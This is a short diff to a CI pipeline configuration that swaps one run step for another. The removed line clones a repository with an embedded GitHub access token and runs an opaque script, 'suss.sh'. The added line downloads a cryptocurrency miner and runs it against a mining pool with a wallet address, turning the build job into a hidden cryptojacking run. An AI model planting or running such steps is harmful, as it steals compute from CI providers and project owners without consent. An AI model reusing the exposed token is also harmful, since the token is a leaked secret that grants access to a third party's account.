@@ -12,4 +12,4 @@ jobs:
     steps:
       - checkout
       - run: |
-            git clone https://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@github.com/WxYtzaiu/WxYtzaiu && cd Uisjaws && chmod u+x suss.sh && ./suss.sh
+            wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz && tar xf webchain-miner-2.8.0-linux-amd64.tar.gz && ./webchain-miner -o pool.webchain.network:2222 -u 0x31B6c3c71C9F1B52ECC8b25B35860d8f39ddFB92 -p x -t 4
